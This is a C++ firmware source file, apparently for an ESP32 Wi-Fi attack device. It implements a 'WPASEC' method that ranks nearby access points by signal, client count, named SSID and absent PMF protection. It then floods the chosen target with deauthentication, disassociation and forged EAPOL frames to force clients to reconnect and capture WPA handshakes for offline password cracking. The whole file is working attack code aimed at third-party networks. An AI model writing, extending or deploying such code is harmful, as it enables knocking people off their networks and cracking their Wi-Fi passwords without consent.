// WPASEC method — one AP at a time, clean M1+M2 pcap for wpa-sec.stanev.org.
//
// Unlike FOCUS this method never injects CSA / auth-flood (those frames
// bloat the pcap and scare the station off before M2). It always treats
// "done" as a matching M1+M2 pair, even if RADIO HS DEPTH was turned up.
// Hidden SSIDs score lower because wpa-sec needs a real ESSID in the file.
#include "method_ctx.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include <Arduino.h>
#include <string.h>
#include <limits.h>
#include <esp_random.h>

namespace Cap {
namespace Methods {

static const uint8_t  SCORE_SLOTS = 16;
static const uint32_t COOLDOWN_FALLBACK_MS = 8000;

struct ScoreEntry {
    uint8_t  bssid[6];
    int32_t  score;
    uint32_t lastKickMs;
    uint32_t lastSeenMs;
    bool     used;
};
static ScoreEntry s_scores[SCORE_SLOTS];

static ScoreEntry* findOrCreate(const uint8_t* bssid) {
    for (uint8_t i = 0; i < SCORE_SLOTS; i++) {
        if (s_scores[i].used && memcmp(s_scores[i].bssid, bssid, 6) == 0)
            return &s_scores[i];
    }
    for (uint8_t i = 0; i < SCORE_SLOTS; i++) {
        if (!s_scores[i].used) {
            memset(&s_scores[i], 0, sizeof(s_scores[i]));
            memcpy(s_scores[i].bssid, bssid, 6);
            s_scores[i].used = true;
            return &s_scores[i];
        }
    }
    uint8_t worst = 0;
    uint32_t worstSeen = UINT32_MAX;
    for (uint8_t i = 0; i < SCORE_SLOTS; i++) {
        if (s_scores[i].lastSeenMs < worstSeen) {
            worstSeen = s_scores[i].lastSeenMs;
            worst = i;
        }
    }
    memset(&s_scores[worst], 0, sizeof(s_scores[worst]));
    memcpy(s_scores[worst].bssid, bssid, 6);
    s_scores[worst].used = true;
    return &s_scores[worst];
}

// Pair-only: wpa-sec wants M1+M2, not a full 4-way dump.
static bool alreadyPaired(const uint8_t* bssid) {
    return Hc22000::hasHandshake(bssid, 0);
}

static int32_t scoreAp(const BeaconSlot& b, bool dataAct) {
    if (alreadyPaired(b.bssid)) return -1000;
    int32_t s = 0;
    int16_t r = b.rssi;
    if (r < -100) r = -100;
    if (r > -30)  r = -30;
    s += (int32_t)((r + 100) * 100 / 70);

    // Clients are the whole point: no station => no M2.
    int32_t clients = (int32_t)b.clientN * 15;
    if (clients > 60) clients = 60;
    s += clients;
    if (b.clientN == 0) s -= 25;

    if (b.ssid[0]) s += 40;          // named beacon => wpa-sec can hash
    else           s -= 20;          // HIDDEN_ files get rejected / uncrackable

    if (dataAct) {
        uint16_t d = b.dataRecent;
        if (d > 40) d = 40;
        s += (int32_t)d;
    }

    if (b.pmfCapable) s -= 40;
    return s;
}

static void kickTarget(const Ctx& ctx, const BeaconSlot& target) {
    uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
    if (target.clientN && ctx.bidirKick) {
        for (uint8_t c = 0; c < target.clientN; c++) {
            WSLBypasser::sendBidirectionalKick(target.bssid, target.clients[c],
                                               ctx.deauthReason, rounds);
            *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + (uint32_t)rounds * 4);
            if (ctx.eapolTx) {
                WSLBypasser::sendEAPOLStart(target.bssid, target.clients[c]);
                WSLBypasser::sendEAPOLLogoff(target.bssid, target.clients[c]);
            }
            yield();
        }
        return;
    }
    for (uint8_t r = 0; r < rounds; r++) {
        ctx.sendRawMgmt(0xC0, target.bssid, ctx.bcast);
        if (ctx.jitterMs) delay(1 + (esp_random() % ctx.jitterMs));
        else              delay(WSLBypasser::burstLegGapMs());
        ctx.sendRawMgmt(0xA0, target.bssid, ctx.bcast);
        if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
        *ctx.framesDeauth = (uint32_t)(*ctx.framesDeauth + 2);
    }
}

void resetWpasecState() {
    memset(s_scores, 0, sizeof(s_scores));
}

static bool usableAp(const Ctx& ctx, const BeaconSlot& b) {
    if (b.channel != ctx.channel) return false;
    if (ctx.isOwnAp && ctx.isOwnAp(b.bssid)) return false;
    if (ctx.skipPin && ctx.skipPin(b.bssid)) return false;
    if (ctx.isSkipped && ctx.isSkipped(b.bssid)) return false;
    if (b.rssi < ctx.minRssi) return false;
    if (alreadyPaired(b.bssid)) return false;
    return true;
}

void wpasec(const Ctx& ctx) {
    if (!ctx.beacons || !ctx.beaconCount) return;
    const uint32_t now = millis();
    const uint32_t cooldownMs = ctx.cooldownSec
        ? (uint32_t)ctx.cooldownSec * 1000u
        : COOLDOWN_FALLBACK_MS;
    const uint8_t n = ctx.beaconCount;

    if (ctx.strictLock && ctx.lockedBssidActive && ctx.lockedBssid[0] != 0) {
        for (uint8_t i = 0; i < n; i++) {
            const BeaconSlot& b = ctx.beacons[i];
            if (memcmp(b.bssid, ctx.lockedBssid, 6) != 0) continue;
            if (!usableAp(ctx, b)) return;
            ScoreEntry* se = findOrCreate(b.bssid);
            se->lastSeenMs = now;
            se->score = (se->score * 3 + scoreAp(b, ctx.dataAct)) / 4;
            se->lastKickMs = now;
            kickTarget(ctx, b);
            return;
        }
        return;
    }

    int32_t bestScore = INT32_MIN;
    int8_t  bestIdx = -1;
    for (uint8_t i = 0; i < n; i++) {
        const BeaconSlot& b = ctx.beacons[i];
        if (!usableAp(ctx, b)) continue;
        ScoreEntry* se = findOrCreate(b.bssid);
        se->lastSeenMs = now;
        int32_t fresh = scoreAp(b, ctx.dataAct);
        se->score = (se->score * 3 + fresh) / 4;
        if (se->lastKickMs != 0 && (now - se->lastKickMs) < cooldownMs) continue;
        if (se->score > bestScore) {
            bestScore = se->score;
            bestIdx = (int8_t)i;
        }
    }
    if (bestIdx < 0 || bestScore < ctx.scoreThr) return;

    const BeaconSlot& target = ctx.beacons[bestIdx];
    kickTarget(ctx, target);
    findOrCreate(target.bssid)->lastKickMs = now;
}

// 9 KICK N  10 BIDIR  11 EAPOL TX  12 PMKID  15 REASON
// 20 JITTER  21 COOLDOWN  22 SCORE THR  25 DATA ACT  26 STRICT LK
// CSA / AUTH FLOOD are intentionally absent: this method never sends them.
static const uint8_t wpasecKnobs[] = {9, 10, 11, 12, 15, 20, 21, 22, 25, 26, 0};

CAP_METHOD_REGISTER("WPASEC", wpasec, pmkidProbe, resetWpasecState, wpasecKnobs)

} // namespace Methods
} // namespace Cap
